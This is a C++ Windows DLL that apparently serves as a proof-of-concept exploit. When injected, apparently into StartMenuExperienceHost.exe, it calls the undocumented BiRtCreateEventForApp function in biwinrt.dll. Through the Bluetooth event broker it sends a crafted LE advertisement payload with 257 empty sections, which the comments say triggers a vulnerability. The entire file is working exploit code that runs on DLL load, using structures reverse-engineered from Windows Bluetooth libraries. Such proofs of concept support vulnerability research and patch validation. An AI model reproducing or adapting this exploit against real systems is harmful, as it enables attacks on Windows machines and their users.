#include <Windows.h>
#include <libloaderapi.h>

#include <functional>
#include <vector>

// Reverse engineered from Windows.Devices.Bluetooth.dll
enum class BR_VALUE_TYPE
{
    INT = 0,
    BUFFER = 4,
};

// Reverse engineered from Windows.Devices.Bluetooth.dll
struct __declspec(align(8)) BR_BUFFER
{
    size_t m_Size;
    const void* m_Data;
};

// Reverse engineered from Windows.Devices.Bluetooth.dll
struct __declspec (align(8)) BR_EVENT_PARAMETER
{
    BR_EVENT_PARAMETER(const wchar_t* name, int32_t value)
    {
        m_Name = name;
        m_Type = BR_VALUE_TYPE::INT;
        m_IntValue = value;
    }

    BR_EVENT_PARAMETER(const wchar_t* name, const BR_BUFFER& value)
    {
        m_Name = name;
        m_Type = BR_VALUE_TYPE::BUFFER;
        m_BufValue = value;
    }

    const wchar_t* m_Name;
    BR_VALUE_TYPE m_Type;
    union
    {
        int32_t m_IntValue;
        BR_BUFFER m_BufValue;
    };
};

#include <fstream>

void TriggerVulnerability()
{
    // Fetch the pointer to BiRtCreateEventForApp
    using BiRtCreateEventForAppFn = HRESULT __stdcall(GUID&, GUID&, size_t, BR_BUFFER&);
    HMODULE biWinRtModule = GetModuleHandle(L"biwinrt.dll");
    std::function<BiRtCreateEventForAppFn> createEventForApp = reinterpret_cast<BiRtCreateEventForAppFn*>(GetProcAddress(biWinRtModule, "BiRtCreateEventForApp"));

    // 257 empty sections to trigger the vulnerability
    std::vector<uint8_t> advData;
    for (uint32_t i = 0; i < 257; ++i)
    {
        advData.push_back(0x01);
        advData.push_back(0x00);
    }

    // event parameters, taken from BluetoothLEAdvertisementPublisherTrigger::Create
    std::vector<BR_EVENT_PARAMETER> eventParameters;
    eventParameters.emplace_back(L"EventType", 4);
    eventParameters.emplace_back(L"Version", 3);
    eventParameters.emplace_back(L"UseExtendedFormat", 1);
    eventParameters.emplace_back(L"IsAnonymous", 0);
    eventParameters.emplace_back(L"IncludeTransmitPowerLevel", 0);
    eventParameters.emplace_back(L"AdvertisementPayload", BR_BUFFER{ advData.size(), advData.data() });

    GUID zeroGuid = {};
    BR_BUFFER eventParams = { eventParameters.size(), eventParameters.data() };

    // Bluetooth GUID, taken from Windows.Devices.Bluetooth.dll
    uint8_t bthEventBrokerGuidBytes[] = { 0x62, 0xE9, 0xCA, 0xFC, 0x22, 0x47, 0xC7, 0x40, 0xA4, 0x6D, 0xFE, 0x51, 0x53, 0x28, 0x07, 0x23 };
    GUID bthEventBrokerGuid = {};
    memcpy(&bthEventBrokerGuid, bthEventBrokerGuidBytes, sizeof(GUID));

    // Send our event
    createEventForApp(zeroGuid, bthEventBrokerGuid, 0, eventParams);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        OutputDebugStringA("Successfully attached to StartMenuExperienceHost.exe\n");
        TriggerVulnerability();
        break;
    default:
        break;
    }
    return FALSE;
}

